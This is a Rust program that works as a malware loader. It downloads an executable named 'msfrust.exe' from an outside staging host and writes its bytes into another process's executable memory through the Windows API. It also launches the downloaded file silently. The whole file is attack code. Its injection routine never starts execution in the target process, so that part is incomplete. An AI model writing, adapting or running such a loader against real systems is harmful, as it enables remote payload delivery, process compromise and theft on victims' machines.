use std::fs::{File, OpenOptions};
use std::io::{self, Read, Write};
use std::sync::{Arc, Mutex};
use std::error::Error;
use std::time::Duration;
use std::process::Command;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS};
use winapi::shared::minwindef::LPVOID;
use winapi::um::handleapi::CloseHandle;
use std::ptr::null_mut;
use reqwest::blocking::Client;
use log::error;
use std::thread;

// Function to download a file from a URL and save it locally
fn download_file(url: &str, output_path: &str) -> Result<(), Box<dyn Error>> {
    let response = Client::new().get(url).send()?;
    let mut dest = OpenOptions::new().create(true).write(true).open(output_path)?;

    let mut content = response.bytes()?;
    dest.write_all(&content)?;

    Ok(())
}

// Function to read the downloaded payload file
fn read_payload(file_path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut file = File::open(file_path)?;
    let mut payload = Vec::new();

    file.read_to_end(&mut payload)?;

    Ok(payload)
}

// Function to inject the payload into a Windows process
fn inject_payload(pid: u32, payload: &[u8]) -> Result<(), Box<dyn Error>> {
    unsafe {
        let process_handle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process_handle.is_null() {
            return Err(Box::new(io::Error::last_os_error()));
        }

        let remote_memory: LPVOID = VirtualAllocEx(
            process_handle,
            null_mut(),
            payload.len(),
            winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
        );
        if remote_memory.is_null() {
            CloseHandle(process_handle);
            return Err(Box::new(io::Error::last_os_error()));
        }

        let mut written: usize = 0;
        let result = WriteProcessMemory(
            process_handle,
            remote_memory,
            payload.as_ptr() as *const _,
            payload.len(),
            &mut written,
        );
        if result == 0 {
            CloseHandle(process_handle);
            return Err(Box::new(io::Error::last_os_error()));
        }

        CloseHandle(process_handle);

        Ok(())
    }
}

fn main() -> Result<(), Box<dyn Error>> {
    // URL and file path for downloading the payload
    let url = "https://stage.attck-deploy.net/msfrust.exe";
    let file_path = "C:\\temp\\msfrust.exe";

    // Download the file from the URL
    download_file(url, file_path)?;
    println!("File downloaded successfully.");

    // Read the downloaded payload
    let payload = read_payload(file_path)?;
    println!("Payload read successfully.");

    // Simulate process injection by injecting the payload into a running process (replace with actual PID)
    let pid: u32 = 1234; // Replace with your target process ID
    inject_payload(pid, &payload)?;

    println!("Payload injected successfully.");

    // Execute the downloaded file (optional, based on your original script)
    let cmd = Command::new(file_path)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;

    println!("Payload executed successfully.");

    // Wait for a few seconds (optional, based on your original script)
    thread::sleep(Duration::from_secs(10));

    Ok(())
}
